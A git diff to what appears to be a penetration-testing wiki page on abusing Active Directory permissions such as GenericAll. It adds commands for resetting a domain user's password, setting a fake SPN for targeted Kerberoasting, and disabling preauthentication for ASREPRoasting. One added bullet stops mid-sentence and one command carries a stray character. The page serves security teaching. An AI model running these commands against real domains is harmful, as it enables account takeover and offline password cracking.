@@ -54,9 +54,21 @@ We can see that indeed our user `spotless` has the `GenericAll` rights, effectiv
 
 ![](../../.gitbook/assets/2.png)
 
-We can reset user's `delegate` password without knowing the current password:
+*   **Change password**: You could just change the password of that user with&#x20;
 
-![](../../.gitbook/assets/3.png)
+    ```bash
+    net user <username> <password> /domain
+    ```
+*   **Targeted Kerberoasting**: You could make the user **kerberoastable** setting an **SPN** on the account, kerberoast it and attempt to crack offline:&#x20;
+
+    ```powershell
+    Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
+    ```
+*   **Targeted ASREPRoasting**: You could make the user **ASREPRoastable** by **disabling** **preauthentication** and then ASREProast it.
+
+    ```powershell
+    Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
+    ```
 
 ## GenericAll on Group
 
@@ -96,7 +108,8 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 
 ## GenericAll / GenericWrite / Write on Computer
 
-If you have these privileges on a Computer object, you can pull [Kerberos **Resource-based Constrained Delegation**: Computer Object Take Over](resource-based-constrained-delegation.md) off.
+* If you have these privileges on a Computer object, you can pull [Kerberos **Resource-based Constrained Delegation**: Computer Object Take Over](resource-based-constrained-delegation.md) off.
+* If you have these privs over a user, you
 
 ## WriteProperty on Group
 
